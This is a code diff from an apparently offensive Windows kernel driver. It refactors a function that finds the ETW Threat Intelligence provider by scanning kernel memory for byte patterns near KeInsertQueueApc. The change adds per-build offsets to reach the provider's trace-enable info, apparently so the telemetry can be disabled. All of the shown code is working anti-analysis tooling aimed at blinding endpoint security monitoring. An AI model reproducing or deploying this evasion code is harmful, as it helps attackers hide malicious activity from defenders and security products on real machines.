@@ -51,6 +51,10 @@ NTSTATUS AntiAnalysisHandler::EnableDisableEtwTI(_In_ bool enable) {
 	EX_PUSH_LOCK etwThreatIntLock = NULL;
 	ULONG foundIndex = 0;
 	SIZE_T bytesWritten = 0;
+	ULONG enableProviderInfoOffset = GetEtwProviderEnableInfoOffset();
+
+	if (enableProviderInfoOffset == 0)
+		return STATUS_UNSUCCESSFUL;
 
 	// Getting the location of KeInsertQueueApc dynamically to get the real location.
 	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"KeInsertQueueApc");
@@ -61,17 +65,28 @@ NTSTATUS AntiAnalysisHandler::EnableDisableEtwTI(_In_ bool enable) {
 
 	SIZE_T targetFunctionDistance = EtwThreatIntProvRegHandleDistance;
 	PLONG searchedRoutineOffset = static_cast<PLONG>(FindPatterns(EtwThreatIntProvRegHandlePatterns,
-		EtwThreatIntProvRegHandlePatternsCount, searchedRoutineAddress, targetFunctionDistance,
+		EtwThreatIntProvRegHandlePatternsCount, 
+		searchedRoutineAddress, 
+		targetFunctionDistance,
 		&foundIndex));
 
 	if (!searchedRoutineOffset)
 		return STATUS_NOT_FOUND;
-	PUCHAR etwThreatIntProvRegHandle = static_cast<PUCHAR>(searchedRoutineAddress) + (*searchedRoutineOffset) + foundIndex +
-		EtwThreatIntProvRegHandleOffset;
-	ULONG enableProviderInfoOffset = GetEtwProviderEnableInfoOffset();
 
-	if (enableProviderInfoOffset == 0)
-		return STATUS_UNSUCCESSFUL;
+	// Getting the address of the ETW-TI provider
+	PUCHAR etwThreatIntProvRegHandle = static_cast<PUCHAR>(searchedRoutineAddress) + 
+		(*searchedRoutineOffset) + 
+		foundIndex;
+	LONG versionDependentOffset = 0;
+
+	for (Pattern pattern : EtwThreatIntProvRegHandlePatterns) {
+		versionDependentOffset = pattern.GetOffsetForVersion(WindowsBuildNumber);
+
+		if (versionDependentOffset != 0) {
+			etwThreatIntProvRegHandle += versionDependentOffset;
+			break;
+		}
+	}
 
 	PTRACE_ENABLE_INFO enableProviderInfo = reinterpret_cast<PTRACE_ENABLE_INFO>(etwThreatIntProvRegHandle +
 		EtwGuidEntryOffset + enableProviderInfoOffset);
